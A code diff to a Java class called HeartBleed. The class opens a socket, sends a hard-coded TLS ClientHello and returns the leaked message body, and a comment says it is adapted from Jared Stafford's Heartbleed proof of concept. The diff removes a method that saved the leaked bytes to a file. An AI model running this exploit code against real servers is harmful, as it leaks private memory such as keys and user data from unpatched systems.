@@ -1,15 +1,11 @@
 import java.net.Socket;
-import java.net.UnknownHostException;
 import java.nio.ByteBuffer;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.OutputStream;
-import java.io.FileOutputStream;
 import java.io.UnsupportedEncodingException;
 
 public class HeartBleed {
-	
-	//test
 	
 	private Socket connection;
 	private InputStream inStr;
@@ -78,18 +74,14 @@ public class HeartBleed {
 		connection.close();
 	}
 	
-	public void save() throws IOException{
-		FileOutputStream out = new FileOutputStream("hbTest.txt", true);
-		out.write(finalMessage.body);
-		out.flush();
-		out.close();
-	} 
+	
 	
 	public byte[] getBytes(){
 		return finalMessage.body;
 	}
 	
 	//hex dump of an SSL/TLS hello message
+	//adapted from Jared Stafford's original proof of concept
 	static byte[] clientHello = {
 			0x16,0x03,0x02,0x00,(byte) 0xdc,0x01,0x00,0x00,(byte) 0xd8,0x03,0x02
 			,0x53,0x43,0x5b,(byte) 0x90,(byte) 0x9d,(byte) 0x9b,0x72,0x0b,(byte) 0xbc,
